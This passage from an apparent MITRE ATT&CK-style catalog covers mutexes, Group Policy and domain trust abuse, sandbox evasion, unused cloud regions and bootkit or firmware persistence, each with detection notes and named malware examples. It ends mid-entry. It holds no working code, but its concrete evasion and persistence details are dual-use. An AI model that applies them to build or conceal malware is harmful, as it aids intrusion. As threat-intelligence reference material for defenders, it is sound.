+- [S0632] GrimAgent: GrimAgent uses the last 64 bytes of the binary to compute a mutex name. If the generated name is invalid, it will default to the generic `mymutex`.
+- [S0496] REvil: REvil attempts to create a mutex using a hard-coded value to ensure that no other instances of itself are running on the host.
+- [S0012] PoisonIvy: PoisonIvy creates a mutex using either a custom or default value.
+- [S1196] Troll Stealer: Troll Stealer creates a mutex during installation to prevent duplicate execution.
+- [S0562] SUNSPOT: SUNSPOT creates a mutex using the hard-coded value ` {12d61a41-4b74-7610-a4d8-3028d2f56395}` to ensure that only one instance of itself is running.
+- [S1183] StrelaStealer: StrelaStealer variants include the use of mutex values based on the victim system name to prevent reinfection.
+- [S0168] Gazer: Gazer creates a mutex using the hard-coded value `{531511FA-190D-5D85-8A4A-279F2F592CC7}` to ensure that only one instance of itself is running.
+- [G0082] APT38: APT38 has created a mutex to avoid duplicate execution.
+- [S1070] Black Basta: Black Basta will check for the presence of a hard-coded mutex `dsajdhas.0` before executing.
+
+
+### T1484.001 - Domain or Tenant Policy Modification: Group Policy Modification
+
+Description:
+
+Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\SYSVOL\\Policies\`. Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain. Malicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution, and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse. For example, publicly available scripts such as New-GPOImmediateTask can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying &lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in &lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.
+
+Detection:
+
+It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including: * Event ID 5136 - A directory service object was modified * Event ID 5137 - A directory service object was created * Event ID 5138 - A directory service object was undeleted * Event ID 5139 - A directory service object was moved * Event ID 5141 - A directory service object was deleted GPO abuse will often be accompanied by some other behavior such as Scheduled Task/Job, which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704).
+
+Procedures:
+
+- [S1058] Prestige: Prestige has been deployed using the Default Domain Group Policy Object from an Active Directory Domain Controller.
+- [S1202] LockBit 3.0: LockBit 3.0 can enable options for propogation through Group Policy Objects.
+- [S0697] HermeticWiper: HermeticWiper has the ability to deploy through an infected system's default domain policy.
+- [G1021] Cinnamon Tempest: Cinnamon Tempest has used Group Policy to deploy batch scripts for ransomware deployment.
+- [S0363] Empire: Empire can use New-GPOImmediateTask to modify a GPO that will install and execute a malicious Scheduled Task/Job.
+- [G0096] APT41: APT41 used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware.
+- [S1199] LockBit 2.0: LockBit 2.0 can modify Group Policy to disable Windows Defender and to automatically infect devices in Windows domains.
+- [G0119] Indrik Spider: Indrik Spider has used Group Policy Objects to deploy batch scripts.
+- [S0554] Egregor: Egregor can modify the GPO to evade detection.
+- [S0688] Meteor: Meteor can use group policy to push a scheduled task from the AD to all network machines.
+- [C0034] 2022 Ukraine Electric Power Attack: During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware.
+
+### T1484.002 - Domain or Tenant Policy Modification: Trust Modification
+
+Description:
+
+Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains. Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge SAML Tokens without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user. An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant. This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.
+
+Detection:
+
+Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes Set federation settings on domain and Set domain authentication. This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details. Monitor for PowerShell commands such as: Update-MSOLFederatedDomain –DomainName: "Federated Domain Name", or Update-MSOLFederatedDomain –DomainName: "Federated Domain Name" –supportmultipledomain.
+
+Procedures:
+
+- [G1015] Scattered Spider: Scattered Spider adds a federated identity provider to the victim’s SSO tenant and activates automatic account linking.
+- [S0677] AADInternals: AADInternals can create a backdoor by converting a domain to a federated domain which will be able to authenticate any user across the tenant. AADInternals can also modify DesktopSSO information.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.
+
+
+### T1497.001 - Virtualization/Sandbox Evasion: System Checks
+
+Description:
+
+Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks into one script and then have the program exit if it determines the system to be a virtual environment. Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`. Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.
+
+Detection:
+
+Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.
+
+Procedures:
+
+- [S0650] QakBot: QakBot can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.
+- [S0354] Denis: Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis.
+- [S0627] SodaMaster: SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality.
+- [S0439] Okrum: Okrum's loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total.
+- [S0260] InvisiMole: InvisiMole can check for artifacts of VirtualBox, Virtual PC and VMware environment, and terminate itself if they are detected.
+- [G0120] Evilnum: Evilnum has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments.
+- [S0024] Dyre: Dyre can detect sandbox analysis environments by inspecting the process list and Registry.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services.
+- [S0438] Attor: Attor can detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts, such as communication with I/O ports and using VM-specific instructions.
+- [S1039] Bumblebee: Bumblebee has the ability to search for designated file paths and Registry keys that indicate a virtualized environment from multiple products.
+- [S0182] FinFisher: FinFisher obtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments.
+- [S0373] Astaroth: Astaroth can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments.
+- [S0242] SynAck: SynAck checks its directory location in an attempt to avoid launching in a sandbox.
+- [S0576] MegaCortex: MegaCortex has checked the number of CPUs in the system to avoid being run in a sandbox or emulator.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D checks a number of system parameters to see if it is being run on real hardware or in a virtual machine environment, such as `sysctl hw.model` and the kernel boot time.
+- [S1048] macOS.OSAMiner: macOS.OSAMiner can parse the output of the native `system_profiler` tool to determine if the machine is running with 4 cores.
+- [S0226] Smoke Loader: Smoke Loader scans processes to perform anti-VM checks.
+- [S0561] GuLoader: GuLoader has the ability to perform anti-VM and anti-sandbox checks using string hashing, the API call EnumWindows, and checking for Qemu guest agent.
+- [S0396] EvilBunny: EvilBunny's dropper has checked the number of processes and the length and strings of its own file name to identify if the malware is in a sandbox environment.
+- [S0248] yty: yty has some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware.
+- [S0532] Lucifer: Lucifer can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected.
+- [G1017] Volt Typhoon: Volt Typhoon has run system checks to determine if they were operating in a virtualized environment.
+- [S0237] GravityRAT: GravityRAT uses WMI to check the BIOS and manufacturer information for strings like "VMWare", "Virtual", and "XEN" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment.
+- [S1213] Lumma Stealer: Lumma Stealer has queried system resources on the victim device to identify if it is executing in a sandbox or virtualized environments, checking usernames, conducting WMI queries for system details, checking for files commonly found in virtualized environments, searching system services, and inspecting process names. Lumma Stealer has checked system GPU configurations for sandbox detection.
+- [S0337] BadPatch: BadPatch attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard information.
+- [S0428] PoetRAT: PoetRAT checked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection, it would delete itself by overwriting the malware scripts with the contents of "License.txt" and exiting.
+- [S0612] WastedLocker: WastedLocker checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique.
+- [S0264] OopsIE: OopsIE performs several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI query SELECT * FROM MSAcpi_ThermalZoneTemperature to check the temperature to see if it’s running in a virtual environment.
+- [S1066] DarkTortilla: DarkTortilla can search a compromised system's running processes and services to detect Hyper-V, QEMU, Virtual PC, Virtual Box, and VMware, as well as Sandboxie.
+- [S0333] UBoatRAT: UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine.
+- [S0689] WhisperGate: WhisperGate can stop its execution when it recognizes the presence of certain monitoring tools.
+- [S1087] AsyncRAT: AsyncRAT can identify strings such as Virtual, vmware, or VirtualBox to detect virtualized environments.
+- [S1018] Saint Bot: Saint Bot has run several virtual machine and sandbox checks, including checking if `Sbiedll.dll` is present in a list of loaded modules, comparing the machine name to `HAL9TH` and the user name to `JohnDoe`, and checking the BIOS version for known virtual machine identifiers.
+- [G0012] Darkhotel: Darkhotel malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with .Md5.exe, and if the program is executed from the root of the C:\ drive, as well as checks for sandbox-related libraries.
+- [S0013] PlugX: PlugX checks if VMware tools is running in the background by searching for any process named "vmtoolsd".
+- [S1019] Shark: Shark can stop execution if the screen width of the targeted machine is not over 600 pixels.
+- [S0192] Pupy: Pupy has a module that checks a number of indicators on the system to determine if its running on a virtual machine.
+- [S0626] P8RAT: P8RAT can check the compromised host for processes associated with VMware or VirtualBox environments.
+- [S0531] Grandoreiro: Grandoreiro can detect VMWare via its I/O port and Virtual PC via the vpcext instruction.
+- [S0240] ROKRAT: ROKRAT can check for VMware-related files and DLLs related to sandboxes.
+- [S0332] Remcos: Remcos searches for Sandboxie and VMware on the system.
+- [S1147] Nightdoor: Nightdoor embeds code from the public `al-khaser` project, a repository that works to detect virtual machines, sandboxes, and malware analysis environments.
+- [S1070] Black Basta: Black Basta can check system flags and libraries, process timing, and API's to detect code emulation or sandboxing.
+- [C0001] Frankenstein: During Frankenstein, the threat actors used a script that ran WMI queries to check if a VM or sandbox was running, including VMWare and Virtualbox. The script would also call WMI to determine the number of cores allocated to the system; if less than two the script would stop execution.
+- [S0270] RogueRobin: RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment.
+- [S0644] ObliqueRAT: ObliqueRAT can halt execution if it identifies processes belonging to virtual machine software or analysis tools.
+- [S0637] NativeZone: NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host.
+- [S0094] Trojan.Karagany: Trojan.Karagany can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.
+- [S0657] BLUELIGHT: BLUELIGHT can check to see if the infected machine has VM tools running.
+- [S1122] Mispadu: Mispadu can run checks to verify if it is running within a virtualized environments including Hyper-V, VirtualBox or VMWare and will terminate execution if the computer name is “JOHN-PC.”
+- [S1207] XLoader: XLoader performs timing checks using the Read-Time Stamp Counter (RDTSC) instruction on the victim CPU.
+- [S1064] SVCReady: SVCReady has the ability to determine if its runtime environment is virtualized.
+- [S0679] Ferocious: Ferocious can run anti-sandbox checks using the Microsoft Excel 4.0 function GET.WORKSPACE to determine the OS version, if there is a mouse present, and if the host is capable of playing sounds.
+- [S0559] SUNBURST: SUNBURST checked the domain name of the compromised host to verify it was running in a real environment.
+- [S1086] Snip3: Snip3 has the ability to detect Windows Sandbox, VMWare, or VirtualBox by querying `Win32_ComputerSystem` to extract the `Manufacturer` string.
+- [S1130] Raspberry Robin: Raspberry Robin performs a variety of system environment checks to determine if it is running in a virtualized or sandboxed environment, such as querying CPU temperature information and network card MAC address information.
+- [S0588] GoldMax: GoldMax will check if it is being run in a virtualized environment by comparing the collected MAC address to c8:27:cc:c2:37:5a.
+- [S1160] Latrodectus: Latrodectus can determine if it is running in a virtualized environment by checking the OS version, checking the number of running processes, ensuring a 64-bit application is running on a 64-bit host, and checking if the host has a valid MAC address.
+- [S0527] CSPY Downloader: CSPY Downloader can search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment.
+- [S1111] DarkGate: DarkGate queries system resources on an infected machine to identify if it is executing in a sandbox or virtualized environment.
+- [G0049] OilRig: OilRig has used macros to verify if a mouse is connected to a compromised machine.
+- [S1179] Exbyte: Exbyte performs various checks to determine if it is running in a sandboxed environment to prevent analysis.
+- [S1145] Pikabot: Pikabot performs a variety of system checks to determine if it is running in an analysis environment or sandbox, such as checking the number of processors (must be greater than two), and the amount of RAM (must be greater than 2GB).
+- [S1180] BlackByte Ransomware: BlackByte Ransomware checks for files related to known sandboxes.
+- [S1159] DUSTTRAP: DUSTTRAP decryption relies on the infected machine's `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID` value.
+
+### T1497.002 - Virtualization/Sandbox Evasion: User Activity Based Checks
+
+Description:
+
+Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro or waiting for a user to double click on an embedded image to activate.
+
+Detection:
+
+User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.
+
+Procedures:
+
+- [G0012] Darkhotel: Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.
+- [S0439] Okrum: Okrum loader only executes the payload after the left mouse button has been pressed at least three times, in order to avoid being executed within virtualized or emulated environments.
+- [G0046] FIN7: FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.
+- [S0543] Spark: Spark has used a splash screen to check whether an user actively clicks on the screen before running malicious code.
+
+### T1497.003 - Virtualization/Sandbox Evasion: Time Based Evasion
+
+Description:
+
+Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time. Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny. Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data). Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.
+
+Detection:
+
+Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.
+
+Procedures:
+
+- [S0565] Raindrop: After initial installation, Raindrop runs a computation to delay execution.
+- [S0626] P8RAT: P8RAT has the ability to "sleep" for a specified time to evade detection.
+- [S0559] SUNBURST: SUNBURST remained dormant after initial access for a period of up to two weeks.
+- [S0574] BendyBear: BendyBear can check for analysis environments and signs of debugging using the Windows API kernel32!GetTickCountKernel32 call.
+- [S0554] Egregor: Egregor can perform a long sleep (greater than or equal to 3 minutes) to evade detection.
+- [S0611] Clop: Clop has used the sleep command to avoid sandbox detection.
+- [S0627] SodaMaster: SodaMaster has the ability to put itself to "sleep" for a specified time.
+- [S0660] Clambling: Clambling can wait 30 minutes before initiating contact with C2.
+- [S0386] Ursnif: Ursnif has used a 30 minute delay after execution to evade sandbox monitoring tools.
+- [S0439] Okrum: Okrum's loader can detect presence of an emulator by using two calls to GetTickCount API, and checking whether the time has been accelerated.
+- [S0512] FatDuke: FatDuke can turn itself on or off at random intervals.
+- [S1066] DarkTortilla: DarkTortilla can implement the `kernel32.dll` Sleep function to delay execution for up to 300 seconds before implementing persistence or processing an addon package.
+- [S1141] LunarWeb: LunarWeb can pause for a number of hours before entering its C2 communication loop.
+- [S1039] Bumblebee: Bumblebee has the ability to set a hardcoded and randomized sleep interval.
+- [S0115] Crimson: Crimson can determine when it has been installed on a host for at least 15 days before downloading the final payload.
+- [S1138] Gootloader: Gootloader can designate a sleep period of more than 22 seconds between stages of infection.
+- [S1018] Saint Bot: Saint Bot has used the command `timeout 20` to pause the execution of its initial loader.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used tools that collected `GetTickCount` and `GetSystemTimeAsFileTime` data to detect sandbox or VMware services.
+- [S0671] Tomiris: Tomiris has the ability to sleep for at least nine minutes to evade sandbox-based analysis systems.
+- [S0697] HermeticWiper: HermeticWiper has the ability to receive a command parameter to sleep prior to carrying out destructive actions on a targeted host.
+- [S0447] Lokibot: Lokibot has performed a time-based anti-debug check before downloading its third stage.
+- [S1086] Snip3: Snip3 can execute `WScript.Sleep` to delay execution of its second stage.
+- [S1212] RansomHub: RansomHub can sleep for a set number of minutes before beginning execution.
+- [S0268] Bisonal: Bisonal has checked if the malware is running in a virtual environment with the anti-debug function GetTickCount() to compare the timing.
+- [S1034] StrifeWater: StrifeWater can modify its sleep time responses from the default of 20-22 seconds.
+- [S0453] Pony: Pony has delayed execution using a built-in function to avoid detection and analysis.
+- [S1132] IPsec Helper: IPsec Helper will sleep for a random number of seconds, iterating 200 times over sleeps between one to three seconds, before continuing execution flow.
+- [S0266] TrickBot: TrickBot has used printf and file I/O loops to delay process execution as part of API hammering.
+- [S1059] metaMain: metaMain has delayed execution for five to six minutes during its persistence establishment process.
+- [S0650] QakBot: The QakBot dropper can delay dropping the payload to evade detection.
+- [S0513] LiteDuke: LiteDuke can wait 30 seconds before executing additional code if security software is detected.
+- [S0632] GrimAgent: GrimAgent can sleep for 195 - 205 seconds after payload execution and before deleting its task.
+- [S0534] Bazar: Bazar can use a timer to delay execution of core functionality.
+- [S0396] EvilBunny: EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.
+- [S0642] BADFLICK: BADFLICK has delayed communication to the actor-controlled IP address by 5 minutes.
+- [S0493] GoldenSpy: GoldenSpy's installer has delayed installation of GoldenSpy for two hours after it reaches a victim system.
+- [S0689] WhisperGate: WhisperGate can pause for 20 seconds to bypass antivirus solutions.
+- [S0694] DRATzarus: DRATzarus can use the `GetTickCount` and `GetSystemTimeAsFileTime` API calls to measure function timing. DRATzarus can also remotely shut down into sleep mode under specific conditions to evade detection.
+- [S0588] GoldMax: GoldMax has set an execution trigger date and time, stored as an ASCII Unix/Epoch time value.
+- [S0561] GuLoader: GuLoader has the ability to perform anti-debugging based on time checks, API calls, and CPUID.
+- [S1064] SVCReady: SVCReady can enter a sleep stage for 30 minutes to evade detection.
+- [S1063] Brute Ratel C4: Brute Ratel C4 can call `NtDelayExecution` to pause execution.
+- [S0658] XCSSET: Using the machine's local time, XCSSET waits 43200 seconds (12 hours) from the initial creation timestamp of a specific file, .report. After the elapsed time, XCSSET executes additional modules.
+- [S0595] ThiefQuest: ThiefQuest invokes time call to check the system's time, executes a sleep command, invokes a second time call, and then compares the time difference between the two time calls and the amount of time the system slept to identify the sandbox.
+- [S0584] AppleJeus: AppleJeus has waited a specified time before downloading a second stage payload.
+
+
+### T1535 - Unused/Unsupported Cloud Regions
+
+Description:
+
+Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure. Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected. A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used.
+
+Detection:
+
+Monitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold.
+
+
+### T1542.001 - Pre-OS Boot: System Firmware
+
+Description:
+
+Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.
+
+Detection:
+
+System firmware manipulation may be detected. Dump and inspect BIOS images on vulnerable systems and compare against known good images. Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior. Likewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed.
+
+Procedures:
+
+- [S0397] LoJax: LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.
+- [S0001] Trojan.Mebromi: Trojan.Mebromi performs BIOS modification and can download and execute a file as well as protect itself from removal.
+- [S0047] Hacking Team UEFI Rootkit: Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.
+
+### T1542.002 - Pre-OS Boot: Component Firmware
+
+Description:
+
+Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking. Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.
+
+Detection:
+
+Data and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) disk monitoring may reveal malicious manipulations of components. Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms. Disk check and forensic utilities may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation. Also consider comparing components, including hashes of component firmware and behavior, against known good images.
+
+Procedures:
+
+- [G0020] Equation: Equation is known to have the capability to overwrite the firmware on hard drives from some manufacturers.
+- [S0687] Cyclops Blink: Cyclops Blink has maintained persistence by patching legitimate device firmware when it is downloaded, including that of WatchGuard devices.
+
+### T1542.003 - Pre-OS Boot: Bootkit
+
+Description:
+
+Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly. In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR). The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code. In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.
+
+Detection:
+
+Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.
+
+Procedures:
+
+- [S0484] Carberp: Carberp has installed a bootkit on the system to maintain persistence.
+- [S0689] WhisperGate: WhisperGate overwrites the MBR with a bootloader component that performs destructive wiping operations on hard drives and displays a fake ransom note when the host boots.
+- [S0266] TrickBot: TrickBot can implant malicious code into a compromised device's firmware.
+- [S0112] ROCKBOOT: ROCKBOOT is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.
+- [G0096] APT41: APT41 deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.
+- [S0114] BOOTRASH: BOOTRASH is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.
+- [S0182] FinFisher: Some FinFisher variants incorporate an MBR rootkit.
+- [G0032] Lazarus Group: Lazarus Group malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.
+- [G0007] APT28: APT28 has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy.
+
+### T1542.004 - Pre-OS Boot: ROMMONkit
+
+Description:
+
+Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.
+
+Detection:
+
+There are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation.
+
+### T1542.005 - Pre-OS Boot: TFTP Boot
+
+Description:
+
